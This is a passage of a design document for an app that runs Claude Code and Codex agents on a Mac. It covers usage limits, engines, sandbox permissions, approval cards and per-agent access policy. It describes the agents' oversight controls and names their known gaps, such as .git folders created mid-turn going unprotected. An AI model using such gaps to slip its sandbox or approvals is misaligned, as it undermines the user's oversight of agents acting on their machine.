  in one glance. First one short headline, from read accounts only:
  "Room now on Claude · This Mac" (one account with room), "Room now on
  both accounts" / "all 3 accounts", "Room now on 2 of 3 accounts", or "No
  room right now" with, under it, who has room again first ("Claude ·
  Work has room again at 3:20 PM"). It never counts or lists the accounts
  again: the cards below say which and when. Then, in the warning ink, the
  Mac's estimate across accounts when it sent one ("At this pace you'll
  run out of Claude on every account by Mon afternoon; Codex has room"),
  over its basis. Then each account with a reading as its own card, most
  room first: its name, "Max plan" and a muted "Used next" (only beside
  another read account of its engine), and a row per limit: name left,
  % right, the bar, "Resets …" under it, and that limit's own pace
  estimate right under its bar, short ("At this pace it runs out tomorrow
  night") over a muted basis ("Estimate from 200 readings over 10 hours");
  that bar is tinted with the warning role so the two agree (as is any
  limit at 90% or more, and the error role at its limit). Accounts with
  nothing to draw follow compact and muted, one line each: not read (why,
  in the Mac's words), out ("Out of usage until …"), "Not signed in". Each
  reading
  shows once: the popover no longer draws the next account's meters above
  the list. `usage_overview` heads its answer with the same TOTAL COMPUTE
  lines, and the run-out under ESTIMATES. A Mac that serves no totals gets
  the old per-engine lists.
- **Plan names only when reported**: Codex's snapshot carries `planType`
  (`Quota::plan`); Claude Code's stream reports none, but its credentials'
  `subscriptionType` does, so a Claude account read without a turn shows
  its plan.
- **Other compute**, detected, never assumed (`inventory::local_compute`,
  cached a minute): Opencode's binary; Ollama (binary or app) and LM Studio
  (`lms` or the app), each asked over loopback for its model list
  (`127.0.0.1:11434/api/tags`, `127.0.0.1:1234/v1/models`, 800 ms, no proxy,
  no redirects, so nothing leaves this Mac) and said
  "installed, not running" when it doesn't answer. Agents don't run on these;
  they are listed so the Chief can say what's there.

**Readings vs estimates.** The rule "only what the engines report, never
estimated" is about *readings* and stands unchanged. A forecast is an
estimate and is always said as one: every value carries `estimate: true`
and how many runs it rests on; tool text heads it "ESTIMATE from this user's
past runs (not a reading)"; the UI says "About 48k tokens a turn · estimate
from 212 past runs". With too little history there is no forecast at all,
never a default.

- **Tokens per run** (`forecast::per_run`) come from the per-day totals
  already kept for every agent and routine (`AgentUsage::days`, 7 days), so
  history from before this existed counts at once. At least `MIN_RUNS` (5)
  runs, else none. A day on which an agent also ran "When…" model checks is
  left out of its per-turn figure (that day's tokens mix both and can't be
  split). An agent with too little history is estimated as an average turn on
  its engine here (`forecast::pooled`), and says so. Low/high are the
  lightest and heaviest day's averages.
- **Share of a limit** is learned, because engines report windows in
  percent, never tokens: each reading is kept as a `forecast::Sample` with
  the account's running token count (`usage_plan::add_tokens`, from each
  turn's reported usage). Within one instance of a window (same kind, same
  reset) the first and last sample give points per token; instances pool
  (`forecast::rate`). No rate until the reading has moved `MIN_RATE_DELTA`
  (2) points with tokens in between. Use of the same plan elsewhere (the CLI,
  the web) moves the percent without our tokens, so the rate errs high: a
  forecast share is an upper-side estimate. This history starts with this
  build: until it exists, forecasts give tokens and say the share "isn't known
  yet".
- **Pace** (`forecast::pace`, `AccountLine.pace`, the phone's `UsagePace`):
  when a window would reach 100% at the recent rate. From the same samples:
  this account's readings of *this instance* of the window (resets within 30
  minutes of each other) inside the lookback (half the window, 1 hour to 1
  day), a least-squares line extended from the latest reading. Served only
  with at least 3 readings over at least 30 minutes, a rise of at least 1
  point, and a crossing after now and before the reset; an account that's out
  has none. Said as "At this pace you'll hit the limit this afternoon, before
  it resets at 4:00 PM" with "Estimate from 6 readings over 2 hours" under it
  (a part of a day, never a minute it can't know), in the chat header's usage
  popover on the desk (`AgentUsageRing`, ⌘K "Show usage"), Settings → Usage,
  the phone's Usage sheet and `usage_overview`'s ESTIMATES. The words live
  once in `packages/companion-protocol/src/usageSheet.ts`, shared by the desk
  ring and the phone sheet.

**Modes** (`usage_plan::Mode`, `usage-plan.json`; Settings → Agents → Usage,
or the Chief's `set_usage_mode`, which always asks on a card first):

- **Normal** (default): no throttling. Before something big (a fan-out, a long
  routine, a nightly pipeline) an agent says in one line what it will likely
  use and which account it runs on, then goes ahead.
- **Save my limits**: ask before heavy work (`usage_plan::ask_first`: a
  forecast of a tenth of a window or more, or a fan-out with no forecast),
  and send light work to agents on lighter models or engines.
- **Use it all before reset**: the user's standing OK to spend capacity that
  would otherwise expire. When a window on the account turns would run on
  next is near its reset (within a fifth of its length, at most a day:
  `five_hour` → last hour, `seven_day` → last day; Codex's own
  `windowDurationMins`; a window we can't size is never spare) with at least
  `SPARE_MIN_PERCENT` (25) points unused, work waits on the spare-capacity
  list, and the Chief is free, the check-in tick (at most every 3 minutes)
  wakes the Chief once per window instance (`usage_plan::should_nudge`,
  `nudged`), with a quiet Note in its chat. The Chief hands items to agents,
  marks them started (`finish_spare_work`), and may bring a routine forward
  (`run_routine_now`, only in this mode; its next time doesn't move). It
  changes no approval: anything that sends, spends, pushes or changes what
  others see still waits for the user's Allow.

**The spare-capacity list**: users add in Settings; any agent adds with
`add_spare_work` ("sometime", "when there's spare capacity"). At most 50
items of 600 characters. A turn answering outside text (a "When…" routine's
items) can't add to it, take items off it or run a routine; and what such a
turn sends with `message_agent` (or answers back to whoever asked it)
carries the taint, so it can't ask the Chief to do it instead. A wake
already recorded for a window (`nudged`, on disk before the Chief is woken,
so a restart doesn't wake it again) also covers a later reading that puts
the same reset up to 30 minutes off.

**Instructions, for every agent, old or new.** The behaviour lives in the
app-owned system prompt (`prompts::usage_section`, built every turn by
`runner::system_prompt_for`) with the user's current mode, so every agent,
including ones created or imported by older builds, has it on its next turn,
and nothing in its own `CLAUDE.md` is rewritten (the safest upgrade: there
is no file text to migrate). The Chief also gets a line on `set_usage_mode`.
It is kept short (it is on every turn) and changes only with the mode:
nothing time-dependent goes in it, since a system prompt that changes every
turn costs the engine's prompt cache on the whole conversation. Spare
capacity reaches the Chief through the nudge, and the user through What's
in flight.

**UI.** Settings → Agents → Usage (⌘K "Usage limits and spare capacity…"):
the mode, each account's reading or "No reading yet", tags ("Plus plan",
"Next turns run here"), each engine's average turn (estimate), other
compute, and the list. What's in flight ends with one muted line when a
window on the next account is near its reset with capacity left ("Claude
5-hour limit resets 3:00 PM · 62% unused"). The phone's Settings shows the
same, read-only (`agents.usagePlan`, additive: an older phone never asks, an
older Mac doesn't list it in `welcome.methods`). Wording lives once in
`packages/companion-protocol/src/usage.ts`.

**What can't be done honestly, and isn't:**

- No engine reports limits in tokens, so "how much is left" is only ever a
  percentage, and any token→share conversion is learned and labelled.
- Claude Code reports no plan name; neither engine reports a reading for an
  account no turn has run on. Those accounts say "No reading yet".
- Opencode and local models aren't agent engines here; they're listed, not
  used.
- Choosing *accounts* by reset time isn't done: the wallet's order is the
  user's, and failover keeps it. Agents choose between *engines* (an agent on
  Codex vs one on Claude Code) by what resets sooner.
- "Route light work to cheaper models" is an instruction to the Chief
  (delegate to agents on lighter models); nothing reclassifies a turn
  automatically.
- Not verified against live accounts: a real nudge firing near a real
  reset, Codex's `planType` on a signed-in account, LM Studio's model list.

## Apps agents can use (`src-tauri/src/agents/apps.rs`)

Every turn is a `claude` process, and Claude Code loads the user's MCP servers
into it, so the apps an agent can use are exactly Claude Code's. "Apps your
agents can use" (the agent editor's Apps row, or ⌘K → "Connect an app for
agents…") is a window onto that, with no state of its own:

- **Connected**: `claude mcp list`, which health-checks each server, so the
  status is Claude Code's. Which rows are user scope is read (never written)
  from Claude Code's `.claude.json` top-level `mcpServers`; only those get
  Remove. claude.ai connectors (names starting `claude.ai `) say "Managed on
  claude.ai"; project/local/plugin servers say they're set up elsewhere.
- **Add an app**: a fixed list in Rust (`SUGGESTED`): Linear, Notion, Figma,
  Sentry, Stripe, Vercel, each the vendor's own remote MCP endpoint with OAuth.
  The webview sends only a name, never a URL. Added with
  `claude mcp add --scope user --transport http <name> <url>`. Left out:
  GitHub (its remote server wants a token header, not OAuth) and Gmail,
  Calendar and Slack, which have no vendor remote endpoint; they come from
  claude.ai's connectors, which Claude Code loads for a claude.ai account.
- **Sign in…** on a "Needs sign-in" row opens `claude` in a terminal sheet,
  where `/mcp` runs Claude Code's own OAuth. Whether a headless `--print`
  turn can start that sign-in itself is not verified, so the copy doesn't
  promise it.

Every call goes through `run_with_timeout` (60s for list, 30s for changes)
with `runner::strip_session_env`, from the agents folder, so what's listed is
what a turn sees. The project MCP modal edits the same Claude Code settings for
the active agent CLI, plus project scope; it's left as it is.

## When the Mac sleeps, a window closes, or the app quits

Agents are not a service. Each turn is one `claude --print --resume <session>`
process that the app starts on this Mac and reads to the end, and the
check-in tick is a loop inside the app. So:

- **A window closes.** By default closing a window quits the app (the
  frontend's close handler calls `exit`), so it is the same as quitting. With
  **Keep running when closed** on (opt-in, macOS), the window is hidden
  instead (`close_to_background`) and nothing stops: agents, check-ins,
  terminals and dev servers in that window carry on. Hiding rather than
  destroying matters, because a destroyed main window runs the global cleanup
  that kills agent processes. Clicking the Dock icon brings hidden windows
  back (`RunEvent::Reopen`); so do a notification and opening that project.
- **The app quits** (⌘Q, or a close with the option off). The turn in progress ends with it: its Claude Code
  process is stopped on the way out (`cleanup_agent_processes`), and any that
  outlived a crash are cleaned up at the next launch. What the agent already
  did (files written, commands run) stands. Messages queued behind that turn
  are on disk (`inbox.json`) and are sent once when the app reopens, after a
  note naming them (see "Quitting mid-turn"). Nothing fires while the app is
  closed.
- **It reopens.** Every conversation is on disk and the next message resumes
  the same Claude Code session, so the agent still has its context. The
  interrupted turn is picked up once in its own session ("Picked up after
  the app restarted"), or ends on "Interrupted… Continue" (see "Durable
  turns"). The app's own confirmation cards left
  pending are marked expired (`store::expire_stale_approvals`); permission
  cards stay answerable, and a late Allow wakes the agent again. Missed
  check-ins follow the rules above: a one-time one fires once, late; a routine
  runs once, late, and doesn't backfill. A turn that panics is handled the
  same way as one the app quit during: what it had done is kept and it is
  picked up once in the same conversation; panicking again ends on an
  Interrupted line with Continue. What you were typing in a chat, and where
  you had read to, come back as they were (`src/lib/chatRestore.ts`).
- **The Mac sleeps.** Everything, the agent's process included, is frozen
  with it, and carries on when it wakes. If its connection dropped meanwhile
  the turn can end in an error, shown with Retry like any other. A turn that
  instead just goes quiet (a half-open connection, a stalled MCP server) is
  not left looking busy: after 10 minutes of wall-clock time with no output
  from the CLI and no tool call open, the working line says "No word from
  Claude Code for N min. It may be stuck; Stop it if it doesn't move on."
  (`runner::quiet_line`). It is not stopped for you; the 3-hour limit still
  applies. A check-in due during sleep is late, under the same rules.

Three things help, offered together (`get_stay_on` / `set_stay_on`), each read
back from the thing itself:

- **Keep this Mac awake** holds the same idle-sleep assertion remote access
  uses (`remote_access::power::start_keep_awake`, `caffeinate -i -s -m -w
  <pid>`), as a standing preference of its own (`AppState.keep_awake`, held
  again at launch). It dies with the app, `-s` only holds on mains power, and
  it can't stop a laptop sleeping when the lid closes (see remote access's
  lid-closed mode). Turning remote access off leaves it held if the user asked
  for it here.
- **Keep running when closed** (`AppState.keep_running_when_closed`) is
  opt-in because it changes what closing a window does for every project, not
  only Agents. Nobody who hasn't turned it on here sees any difference.
- **Open at login** is remote access's own login item
  (`remote_access::power::set_open_at_login`, the
  `studio.ship.reopen-at-login` LaunchAgent): one file, so turning it on or off
  here shows in remote access's checklist too. Hidden in a dev build, which has
  no installed app to reopen.

They are offered in two quiet places only, and only once they matter: at the
foot of What's in flight while an agent is working or something is scheduled
(not on a new user's first screen, which is the Chief's hello), with a line
that says what happens ("Quitting the app stops them, and sleep pauses
them.", or with Keep running on, "Closing the
window keeps them going; quitting stops them, and sleep pauses them.") and one
line suggesting an always-on Mac, such as a Mac mini or a cloud Mac, for
round-the-clock agents; and as a "Keep this Mac awake" link at the end of the
schedule popover's footnote. Elsewhere than macOS none of it shows.

## Menu bar, quit guard and quick entry (`agents/tray.rs`, `agents/quick_entry.rs`)

Agents run inside the app, so staying alive, and being reachable while
the window is closed, is part of the product.

**Menu-bar icon.** A monochrome template image (`src-tauri/icons/tray/*.svg`,
rasterised by `pnpm icons:tray`): a placeholder ring (until real branding), with a dot while
anything needs you. The menu is a pure function of the agents and their live
status (`tray::menu_model`), rebuilt at most every 300ms on `agents://status`
and `agents://registry`:

- **Needs you** (up to 5): `Name · Needs your OK` (`· 3 need your OK`).
- **Working** (up to 5): `Name · <activity line>`, cut to one short line. An agent waiting for a free slot is listed after the running ones and isn't counted as working: the tooltip says `2 working, 1 waiting for a slot` (`runner::queued`).
- Overflow is counted (`2 more`), not listed. Hidden agents aren't listed; idle ones aren't either.
- Then Open <name>, New message to Chief… (quick entry), Keep this Mac awake / Keep running when closed (checkmarks, the same `set_stay_on`), Quit <name> (`brand::NAME`).
- Clicking an agent opens its chat (`notify::open_agent`, the notification click's path), showing a window that a close hid.

Shown by default **once the user has actually used Agents, or while Keep
running when closed is on** (`AppState.menu_bar_icon`, `None` = that rule).
"Used" is `AppState.agents_used`, set by `tray::mark_used` on the first
message sent to any agent (`agents_send`, so quick entry too) or the first
import (both import paths); an agent that already has a session counts, for
installs from before the flag. Someone who never touches Agents gets no new
icon in a crowded menu bar. Settings → General overrides it either way.
Rows are engine-agnostic: Claude Code and Codex turns report through the
same runner status and approval cards. Quick entry stays opt-in (it follows
Keep running only). Turning Keep running off *from the icon*
pins the icon on, so it doesn't vanish under the pointer.

**Quit guard.** ⌘Q, the icon's Quit, ⌘K "Quit…", and closing a
window while it would quit all go through `useQuitGuard`, which asks
`agents_quit_check` (`tray::quit_check`: agents mid-turn or queued for a slot,
agents with a check-in due in the next 24 hours, and agents with an open card,
hidden ones included). Only what a quit actually stops is a reason to warn: a
turn in progress, and a check-in that can't fire while the app is closed (it
runs late, on reopen). An open card is not: it survives the restart and a late
Allow resumes the turn, so it is only said, as "Lead Gen's request will still
be here when you reopen". Nothing stopped: the old "Are you sure?" (and the
icon's Quit just quits). Otherwise "2 agents are still working. Quit anyway?"
(or "Finance has a routine coming up."), naming them, with **Keep running in
background** (macOS; hides every window, `hide_all_to_background`) as the
default, then Quit, then Cancel. The backend brings the main window forward
first, since it may be hidden. The updater's restart is untouched: it still
waits for `agents_busy` to reach 0.

**Quick entry.** A system-wide shortcut (`tauri-plugin-global-shortcut`,
default ⌥Space, Settings → General) opens a small floating composer over any
app: its own window (`quick-entry`), created hidden at launch so the shortcut
only shows it, on the display under the pointer, a third of the way down.

- To the Chief of Staff; a leading `@Name` sends it to that agent instead (`quickEntryRecipient`, longest name wins). Other @mentions work as in a chat.
- Dictation is the chat composer's (`useDictation`). The camera runs `screencapture -i -o -x` (drag a region, or Space and click a window) with the composer hidden; the PNG goes to `<agents>/.quick-entry/` (cleared after a day) and is attached like a file. **macOS asks for Screen Recording permission the first time**; the composer says so until a screenshot has worked.
- Return sends (queued like any message), focus goes back to the app you were in (`[NSApp deactivate]`), and "Sent to Chief of Staff · Open chat" stays up 2.4s, unfocused, then hides. Esc or clicking elsewhere closes; closing hands focus back (`NSApp hide`) if the app wasn't in front.
- The shortcut is released while one of the app's own windows has focus, and taken again when they lose it: in-app, ⌥Space stays the composer's hold-to-dictate key.
- Conflicts we can know are refused with a reason (`Accelerator::conflict`): no ⌃/⌥/⌘, macOS's own (⌘Space, ⌃Space, ⌃⌥Space, ⌃⌘Space, ⌘⇧3/4/5, ⌘Tab…), and a bare ⌘-letter every app uses. Another app's global shortcut can only be found by trying; when macOS refuses, the old shortcut is put back and the reason shown.
- Off by default unless Keep running when closed is on (`AppState.quick_entry`): a global ⌥Space takes a non-breaking space from every other app.

Not verified in a real app yet (built and unit-tested only): the icon's look
in a light and a dark menu bar and its dot, the menu rebuilding while open,
the shortcut firing over other apps and full-screen Spaces, the composer
appearing without bringing the main window forward (it's a normal window,
not a non-activating panel), focus returning after send and Esc,
`screencapture` and its permission prompt, and the quit guard from the icon
with the window hidden.

## Engines: Claude Code or Codex (`agents/engine.rs`, `agents/codex_app.rs`, `agents/codex.rs`)

Each agent has `engine: "claude" | "codex"` (default `claude`), so it can run
on a ChatGPT plan with the same chat, tools, memory and Chief around it. The
editor's **Runs on** (`AgentEngine.tsx`) appears only once two engines are
installed; with one there is nothing to choose, and the dialog's foot has a
quiet "Also use Codex" that opens the same set-up terminal as the chat's. An
installed engine that isn't signed in (Codex: `codex login status`; Claude
Code counts once installed) is disabled, with "Codex isn't signed in." and
Sign in. A new agent starts where **Settings → Agents** says new agents start
(see "Defaults for new agents" below), and `agents_create` refuses an engine
that isn't ready, whether it was chosen or defaulted. One line says what protects an agent on that engine
(`engineProtections`), never more than is enforced: for Claude Code, the
app's own tools and the user's own allow rules don't ask; for Codex, apps
connected to Codex itself run outside its limits. When `EngineInfo.asks` is
false (a Codex without a usable app-server), the chat says so above the
composer and the phone's agent sheet says so under "Runs on"
(`engineCantAsk`). A schema check that timed out or didn't start is not
cached, so a slow moment doesn't stick as "can't ask". An
agent on an engine other than Claude Code wears a small badge in the sidebar
and the team view. Model offers
that engine's own list: Claude Code's aliases, or Codex's own
`models_cache.json` (`visibility: list`, its order). The Chief can set it on
`create_agent` / `update_agent`; both refuse an engine that isn't ready.
Switching clears the session and the model, leaves a note ("Runs on Codex
from its next message"), and the next turn gets the recent conversation
(`Agent.newEngine` → `with_recap`).

### Defaults for new agents (`agents/defaults.rs`)

Settings → Agents → Engines and models (`AgentDefaultsSettings.tsx`) sets what
a new agent starts on when nobody picked, saved in the app's settings
(`AppState::agent_defaults`: `engine`, `claudeModel`, `codexModel`):

- **New agents start on** — Claude Code | Codex, only the engines
  `agents::engine` runs. One that isn't installed and signed in is greyed out,
  and `agents_set_defaults` refuses it. Never chosen, the rule decides:
  Claude Code when ready, else the first engine that is
  (`engine::default_for`).
- **Model on Claude Code / Model on Codex** — one row per installed engine:
  "Engine's default" (no `--model`) and only the models that engine itself
  reports or accepts: Claude Code's aliases (said by what they're for, the
  alias beside it), Codex's `models_cache.json`. An engine that lists none
  has no menu, just "Codex hasn't listed its models, so new agents use its
  default."

Nothing is trusted on the way out (`defaults::view_of`, carried in the
overview as `defaults`): a chosen engine that stops being ready (signed out)
stays chosen, but `startsOn` falls back to the rule and the row says
"Codex isn't ready, so new agents start on Claude Code for now"; a saved model
the engine no longer lists is its default.

Who reads it: the New agent dialog opens on `startsOn` and that engine's
model, and switching engine there takes the other engine's default model;
`agents_create` fills in whichever of engine and model wasn't given (an empty
model is a choice, the engine's own); the Chief's `create_agent` (which takes
no model) and the phone's `agents.create` use both. **Existing agents never
change** with it, and an existing agent moved to another engine goes to that
engine's own default, as before. ⌘K "Engine and model for new agents…" opens
Settings on it. The phone reads it from the overview and sets it with
`agents.setDefaults` (docs/mobile.md, "Settings").

**The boundary.** `engine::Engine` is what an agent is on; `driver::Driver`
is how one turn runs it (`ClaudePrint`, `CodexApp`, `CodexExec`), picked once
per turn. It answers everything engine-specific about starting a turn (the
sign-in check, who names a new session, the command line, whether stdin stays
open, the leftover-process mark, capabilities read before the turn), and the
runner reads each engine's output as the shared `stream::Step`s. A third
engine is an `Engine` variant, a module for its command line and stream, and a
`Driver` variant; the compiler names the rest.

A Codex turn is one `codex app-server` (`agents/codex_app.rs`), spoken to
over JSON-RPC on stdin/stdout:

```
codex app-server
  -c permissions.shipstudio_agent={extends=":workspace",network={enabled=false},
       workspace_roots={<home or project dirs>=true},
       filesystem={<each existing .git / .shipstudio in them>="read"}}
  -c default_permissions="shipstudio_agent"
  -c mcp_servers.app={url=…/mcp/agent,bearer_token_env_var="SHIPSTUDIO_AGENTS_BRIDGE_TOKEN",
       tool_timeout_sec=300,default_tools_approval_mode="approve"}
  -c project_doc_fallback_filenames=["CLAUDE.md"]
→ initialize, initialized
→ thread/start {cwd, approvalPolicy:"on-request", model, developerInstructions}
               (or thread/resume {threadId, …})
→ turn/start {threadId, input:[prompt]}
```

The permissions profile (Codex 0.166+, read off `codex --version`) is what
keeps `.git` and `.shipstudio` read-only: Codex accepts a glob only to deny
*reading*, so the folders are listed by path (`reach::protected_paths`: the
roots, the projects in them and copies under `.worktrees/<project>/`, three
levels deep, at most 400). Verified on 0.166 with `codex sandbox -P`: a nested
project's `.git` and `.shipstudio` refuse a write while the project stays
writable, and `thread/start` answers with the profile active. Re-checked on
0.166: a `"<root>/**/.git"="read"` entry is refused ("filesystem glob path …
only supports `deny` access"), and `deny` would stop git reading its own
store, so there is no pattern to fall back on. The list is fixed when the
turn's process starts, so a `.git` created during a turn (`git init`, `git
clone`), one deeper than three levels, or past the cap isn't protected until
the next turn scans again (the first two) or at all (the cap).
A thread names no `sandbox` of its own then, since it would replace the
profile. An older Codex keeps the legacy
`sandbox_workspace_write.writable_roots` + `network_access=false` (and the
thread's `sandbox:"workspace-write"`), which only protects each root's own
top-level `.git`.

Its messages map onto the same `stream::Step`s as Claude Code's stream-json,
and only those in our own thread (a sub-agent's run in threads of their own
and stay internal): the thread id → session; `item/started agentMessage` +
`item/agentMessage/delta` → a draft, and `item/completed agentMessage` → the
reply in its place; other items as they start → the activity line (labelled
as the matching Claude Code tool); `thread/tokenUsage/updated` (`last`,
summed over the turn) → usage (tokens only: a plan reports no price;
duration timed here); `turn/completed` → done, or the error when `failed`;
`error` with `willRetry` → "Reconnecting to Codex". Done closes stdin, and
the app-server exits.

**Approvals.** Sandboxed commands run without asking, like Claude Code's
`acceptEdits` edits. Anything that needs more reaches us as a request and
becomes the same card a Claude Code call gets, through `mcp::decide`
(one-time grant from a late Allow → "Always allow" rule → card):

| Codex asks | Card as | Allow / deny |
|---|---|---|
| `item/commandExecution/requestApproval` (the model asked to escalate) | `Bash {command}` (shell wrapper peeled), Codex's reason under it | `accept` / `decline` |
| `item/fileChange/requestApproval` | `Edit {file_path}` (paths from the item) | `accept` / `decline` |
| `mcpServer/elicitation/request` with `_meta.codex_approval_kind = "mcp_tool_call"` (a write tool on the user's own MCP servers) | `mcp__<server>__<tool> {tool_params}` | `accept` / `decline` |
| `item/permissions/requestApproval` | "Allow more access" (network, paths) | the requested profile for the turn / none |

A decline carries no message, so what the agent is told ("the user said no,
and told you: …", or "hasn't answered yet") goes as `turn/steer` just before
it: queued on the open turn, the model reads it with the declined call's
result (sent after, it can miss the turn). Questions (`requestUserInput`)
and other elicitations are declined with a steer to ask in the chat;
requests we don't handle get a JSON-RPC error rather than hanging.

No network is set on the command line and again on the thread, so a
`network_access = true` in the user's own `~/.codex/config.toml` can't widen
it (checked on 0.166: `codex sandbox` with `network_access=true` reaches the
internet and with `false` doesn't; `thread/start` echoes `networkAccess:
false` even when the command line said `true`).

**Stop and ⌘Enter** send `turn/interrupt` and wait up to 3s for the turn to
end (`interrupted`) before the process tree is stopped. Codex sends no
completed message for a reply cut off, so the draft is kept as stopped,
exactly as for Claude Code.

**Fallback.** `codex_app::available` asks the installed Codex for its own
protocol schema (`app-server generate-json-schema`, ~0.1s, once per binary
until it changes; a check that timed out, didn't start or was killed is asked
again next time) and needs every method above. Without them a turn is
`codex exec [resume <thread id>] --json --skip-git-repo-check` with the same
`-c` overrides plus `sandbox_mode="workspace-write"`, `approval_policy="never"`
and `developer_instructions`: replies arrive whole, nothing can ask (exec
forces approvals to "never"), and the prompt says so instead
(`prompts::for_codex_exec`). Debug builds force it with
`SHIPSTUDIO_AGENTS_CODEX_EXEC=1`.

Capabilities come from what we serve it, its built-ins and `codex mcp list
--json`, read before each turn (Codex announces no tools). Failures read as
"Codex's usage limit is reached. It resets at 7:18 PM." (from its "try again
at 7:18 PM", this Mac's time) and "Codex is signed out." (checked before the
turn, which otherwise spends 20s retrying a 401), with "Sign in to Codex"
running `codex login`. A vanished thread (`thread/resume` → "no rollout
found") is replaced once, like a lost Claude session.

What still differs from a Claude Code agent, verified on Codex 0.166:

- **What asks.** Claude Code asks for every command not allowed; Codex runs
  commands inside its sandbox (the agent's home and the user's projects, no
  network) without asking, and only going past it asks.
- **Memory.** `developer_instructions` is set when a thread starts; Codex
  re-reads the project doc every turn and hands over a changed one, so an
  unbound agent's CLAUDE.md is its project doc and memory edits reach the
  next turn. A bound Codex agent runs in its project, whose own AGENTS.md
  (or CLAUDE.md) loads; its identity rides in the developer instructions.
- No Claude in Chrome; "Apps" are the MCP servers set up in Codex.

Not verified against a signed-in ChatGPT account (none on the build machine):
real model behaviour on these prompts, the real usage-limit response (its
wording was produced by Codex itself from a scripted 429), and a real reset
time. The e2e Codex scenarios run on the account when one is signed in.

## Search, model and usage

- **Search.** In Agents mode the sidebar's top field searches conversations
  (⌘F focuses it; ⌘K stays the palette, and the palette's "Search agent
  conversations" does the same). With no sidebar to hold it (compact width, or
  the rail collapsed) it opens over the chat instead. It scans every agent's
  `messages.jsonl` directly, with no index: every word must appear, case is
  ignored, newest first, at most 50 hits (`src-tauri/src/agents/search.rs`).
  Results replace the list, grouped by agent. Enter opens the first hit;
  opening one loads older history if needed, expands a collapsed agent-to-agent
  thread that holds it, centres the line, and puts focus in the composer; the
  opened hit stays marked. Snippets are re-cut on the frontend to start a few
  words before the match, so it survives the sidebar's two-line clamp. Esc
  anywhere in Agents mode clears it.
- **Messages.** Agent replies are prose on the canvas; your messages are
  bubbles. Hover or focus shows Copy and the time (the exact time is its
  tooltip); Copy isn't a Tab stop, but a clicked message takes focus and ⌘C
  copies it. The newest error, with nothing said since, offers Retry (sends
  your last message again whole: words, quotes and files, re-copied from the
  agent's home) and, for an expired login, "Sign in to Claude Code" (the same
  `claude auth login` terminal the dashboard uses). A usage limit with a known
  reset also offers "Retry at 3:00 PM": a one-time check-in at the reset whose
  note carries what you asked; once it exists the line says "Retries at …".
  "Set up Claude Code" (no Claude Code yet) runs the install terminal, then
  sign-in, and the composer unlocks when the overview says it's there.
- **Routines' model.** The same menu says what routines run on, and changes
  it: Automatic (Haiku while the agent is on the default model, otherwise its
  own model), Same as its chats, or a model. A routine fires again and again,
  usually long after the last turn (so nothing is cached either way), and
  mostly checks things, so this is where a cheaper model saves the most.
  Haiku is Claude Code's: a Codex agent's routines run on its own model
  (Same as its chats) unless one of Codex's models is picked, because which
  of Codex's models is cheaper is not something Codex says. Moving an agent
  to another engine resets the setting along with its model.
  One-time check-ins, including "Retry at", run on the agent's own model
  (`store::Agent::routine_model`).
- **Model.** Said by what it's for — Default / Most capable / Balanced /
  Fastest — with Claude Code's own name (Opus / Sonnet / Haiku) in small
  text beside it; passed as `--model` from the next turn. Set it when creating
  the agent (it starts on the default for its engine, Settings → Agents),
  in the editor, or at the foot of the chat header's … menu, which
  also names the engine. The header itself shows the agent's role (idle) or
  what it's doing, never the engine. Only Claude Code's own aliases are accepted, and the backend
  enforces that too. Default means no `--model`, so whatever Claude Code
  defaults to.
- **Effort.** How hard its conversation turns think: Engine's default, Low,
  Medium or High (`store::EFFORTS`, the three both engines take), in the
  same … menu and on the phone's Agent controls. Claude Code gets
  `--effort <level>` (2.1.319 also takes `xhigh` and `max`); `codex exec`
  gets `-c model_reasoning_effort="<level>"`; the app-server gets `effort` on
  `turn/start` (0.166's schema: "this turn and subsequent turns", so going
  back to the default leaves a Codex thread on the level it last had until
  it starts a new session). Routines don't take it: they mostly check, on a
  cheaper model that may not offer the same levels. A change to the model or
  effort, like an engine move, leaves one Note in the chat ("Now on Opus ·
  High from its next message").
- **Usage.** Each turn's final stream-json `result` event adds its token counts,
  `total_cost_usd` and `duration_ms` to the agent, all time and per day for the
  last 7 days (`src-tauri/src/agents/usage.rs`). Nothing is estimated: a turn
  that reports no cost adds tokens only, and a period containing one shows no
  dollar figure at all. The editor shows "This week" and "All time".

## What each agent can do (`agents/policy.rs`, `agents/policy_card.rs`)

One policy per agent, inheriting from a team default (`access.json` beside
the agents; the team's independence stays in `independence.json`). Each
dimension is the team's unless the agent has its own; rules add up (team's,
then its own).

| Dimension | Values | Enforced by |
| --- | --- | --- |
| Projects | all / listed / none; how in the one it's set to work in: read-only, its own copy, directly; other projects: read or change | the app: `--add-dir` / Codex writable roots carry only writable projects; `Edit(/<project>/**)` deny rules (Codex: read-only paths) for a read-only working folder or a copy's original; the broker refuses edits outside them and reads of projects out of scope (`policy::verdict` in `mcp::decide`); project tools refuse sessions/push where it may only look (`sessions::call`); copies follow `how` (mirrored to `work_directly`) |
| Folders | paths, read or read-and-change | writable ones are added to the turn; reads in the others pass the broker without a card, writes are refused |
| Apps | all / only some / none | the broker refuses `mcp__<app>__*` calls; the relay refuses a connection (`Connection::grant_for` reads the policy) |
| Browser | yes / no | `--no-chrome` (mirrored to `reach.browser_off`, which the access chain's browser reads) and the broker |
| Independence | team's or its own level | prompt only (`policy::independence_for`; outside text still never goes hard) |
| Admin | may propose for others (Chief by default) | `propose_settings_change` |
| Sent under your name | as its independence allows / only after you OK the exact text (`outward_text_needs_ok`) | the app, at every level including Unleashed (`agents/outward.rs`) |
| Rules | free text | prompt only, and every UI line and card says so |

**The exact-text switch** (`outward_text_needs_ok`, `agents/outward.rs`).
The owner's rule "nothing goes out under my name unless I approve that exact
text" was prompt text only, "(an instruction, not enforced)". Now it is a
typed team or agent setting, set from chat (`propose_settings_change`
`changes.outward_text_needs_ok`; on applies at once, off needs the card) or
from "What it can do". On, any send, post, comment or email under the user's
name (`outward::sends_as_user`: chat and mail CLIs, an AppleScript that sends,
`git send-email`, `gh` issues, pull requests, comments, reviews, releases and
gists and `gh api` writes to them, web writes to chat, mail and social APIs;
a browser step Bold asks for, such as a send click or Enter in a message
box; connector tools that send, post, reply, comment or publish) runs only
after a card whose summary shows the exact words going out
(`outward::texts`: message, title and body flags, here-documents, body files,
a connector's text fields, what was typed on the page), or under an
`ask_plan` grant whose action carries those words in `text` (title and body
together, whitespace aside; a part of the OK'd text is not covered, nor is a
body file the app can't read). No level, standing rule, card sweep or admin
answers it. A rule whose words already say this ("exact text", "word for
word", "approve … text") turns it on, once, on load (`policy::migrate_exact_text`)
or when added; the rule's words stay. Presets keep it. Limits: words the app
can't read (a file it can't open, a page it didn't see typed) are said so on
the card rather than shown; text an agent typed in a browser step the app
